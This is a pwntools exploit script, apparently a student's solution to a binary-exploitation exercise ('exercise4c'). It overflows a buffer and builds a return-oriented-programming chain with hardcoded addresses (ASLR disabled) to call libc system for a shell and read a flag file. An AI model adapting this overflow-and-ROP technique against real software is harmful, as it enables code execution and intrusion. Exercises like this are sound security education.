#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise4c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# You can now communicate with the process, e.g.,
# p.sendline("AAAAA")
# p.recvline()
print(cyclic_find(0x6261616A)) # 136
r.sendline(b"ABCD") # Not sure why this helps?
# Do the rop chain
buf_start = 0x07FFFFFFFDD70 # as NOASLR always the same
get_msg_add = 0x00555555555215
rop = ROP(exe)
gm_text_addr = rop.resolve("get_message")
text_base = get_msg_add-gm_text_addr
print(f"text_base: {hex(text_base)}")
# do it now
#rop(rdi=buf_start) # does not work as it's only text offset
# align stack and move pointer to rdi
xor_poprdi_poprbp = 0x11d3
start_main_add = 0x1555553410B3 - 0xf3 # no ASLR or PIE? TODO LOL, not sure this will work on grading machine
str_bin_sh = start_main_add + 0x1905ea
rop.raw(text_base + xor_poprdi_poprbp)
#unused_add = 0x011C9
#rop.raw(text_base + unused_add)
#rop.raw(buf_start)  # pop rdi
rop.raw(str_bin_sh) # pop rdi directly into libc
rop.raw(0x07FFFFFFFDD80)     # pop rbp
pop_rsi_pop_add = 0x0000000000001321 # pop rsi; pop r15; ret;
rop.raw(text_base + pop_rsi_pop_add)
rop.raw(0x0) # zero them out
rop.raw(0x0)
rop.raw(text_base + 0x000000000000101a) # alignment ret
system_add = start_main_add + 0x2e450
rop.raw(system_add) # --> fails???
#exit_add = start_main_add + 0x22c00
#rop.raw(exit_add) # --> works
#execve_add = start_main_add + 0xbf330
#rop.raw(execve_add) # --> not sure what it helps
#rop.raw(text_base + 0x000000000000101a) # alignment ret
#rop.raw(system_add) # Valid return for the system --> works
rop.raw(get_msg_add) # Valid return for the system --> works
print(rop.dump())

# Send rop chain
raw_rop = rop.chain()
cat_flag  = b"/bin/bash\x00"
r.sendline(b"\x00"*8 + cat_flag*4 + cyclic(128-len(cat_flag*4)) + raw_rop)
r.sendline(b"cat flag")
print(r.recvall(timeout=1).decode())